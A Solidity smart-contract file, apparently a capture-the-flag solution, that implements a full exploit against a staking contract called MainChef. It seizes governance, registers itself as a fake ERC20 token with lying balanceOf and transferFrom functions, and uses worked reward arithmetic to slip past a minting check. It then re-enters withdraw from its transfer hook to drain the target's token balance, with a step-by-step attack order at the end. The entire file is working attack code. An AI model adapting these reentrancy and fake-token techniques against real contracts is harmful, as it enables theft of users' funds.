// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/access/Ownable.sol";
import "./KhinkalToken.sol";

interface IMainChef {
    function setGovernance(address _governance) external;
    function withdraw(uint256 _pid) external;
    function deposit(uint256 _pid,uint256 _amount) external;
    function addToken(IERC20 _lpToken) external; 
    function updatePool(uint256 _pid) external;
}


contract MainChefAttack is Ownable {
    IMainChef target;
    uint pwnedtransferFlag;
    uint pwnedtransferFromFlag;
    uint balanceOfFlag;
    uint256 pid;
    KhinkalToken khinkal;
    uint256 accKhinkalPerShare;
    
    constructor(address _target, address _token) public {
        target = IMainChef(_target);
        khinkal = KhinkalToken(_token);
        balanceOfFlag = 1;
        pid = 1;
        pwnedtransferFlag = 0;
    }
    
    function setAccKhinkalPerShare(uint256 _accKhinkalPerShare) public onlyOwner {
        accKhinkalPerShare = _accKhinkalPerShare;
    }
    
    
    // function balanceOf(address account) public view virtual returns (uint256) {
    function balanceOf(address account) public virtual returns (uint256) {
        if (balanceOfFlag == 1) {
            return 0;
        } else {
            return 1e18;
        }
    }
    
    
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        // reentrant attack exp
        if (pwnedtransferFlag == 1) {
            pwnedtransferFlag = 2;
            if (khinkal.balanceOf(address(target)) > 0) {
                target.withdraw(pid);
            }
            return true;
        }
        if (pwnedtransferFlag == 2) {
            // 1 + 78333646677 = 78333646678
            // withdraw 500004127749479808 * 2
            uint256 leftBalanceChallenge = khinkal.balanceOf(address(target));
            uint256 withdrawBalance = 500004127749479808 * accKhinkalPerShare / 1e12;
            
            if (leftBalanceChallenge < withdrawBalance) {
                 khinkal.transfer(address(target), withdrawBalance - leftBalanceChallenge);
            } else if (leftBalanceChallenge < 2 * withdrawBalance) {
                khinkal.transfer(address(target), 2 * withdrawBalance - leftBalanceChallenge);
            }
            
            pwnedtransferFlag = 3;
            if (khinkal.balanceOf(address(target)) > 0) {
                target.withdraw(pid);
            }
            return true;
        }
        if (pwnedtransferFlag == 3) {
            pwnedtransferFlag = 0;
            if (khinkal.balanceOf(address(target)) > 0) {
                target.withdraw(pid);
            }
            return true;
        }
        return true;
    }
    
    // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        return true;
    }
    
    
    function attackPwnedPrepare() public payable onlyOwner {
        target.setGovernance(address(this));
        target.addToken(IERC20(address(this)));
        
        // after 5 block number
        /** 
         *  internal 5 block number
            khinkalReward = 5 * 31333333337 / 2  = 78333333342
            accKhinkalPerShare = khinkalReward * 1e12 /1e18
            				   = 78333333342 * 1e12 / 1e18
            				   = 78333
            instance = 313337 + khinkalReward
            		 = 313337 + 78333333342
            		 = 78333646679
            lastKhinkalReward = khinkalReward = 78333333342
            
            bypass require(pending <= pool.lastKhinkalReward, "Reward bigger than minted");
            78333646679
            78333646679 / 2 = 39166823339
           >>> "%.40f" %(39166823339*1e12/78333)
          '500004127749479808.0000000000000000000000000000000000000000'
        */
        target.deposit(pid, 500004127749479808);
    }
    
    function attackUpdatePool() public payable onlyOwner {
        balanceOfFlag = 0;
        target.updatePool(pid);
        balanceOfFlag = 1;
    }
    
    function attackPwned() public payable onlyOwner {
        pwnedtransferFlag = 1;
        target.withdraw(pid);
    }
    
    
    function validateInstanceAddress() public view returns (bool) {
        return khinkal.balanceOf(address(target)) == 0;
    }
    
    
    function getInstance() public view returns (address) {
        return address(target);
    }
    
    
    function getTokenAddress() public view returns (address) {
        return address(khinkal);
    }
}


/**
 *  1. deployed MainChefAttack
 *  2. MainChefAttack.attackPrepare()
 *  3. MainChefAttack.attackUpdatePool()
 *  4. MainChefAttack.setAccKhinkalPerShare()
 *  3. MainChefAttack.attackPwned()
*/
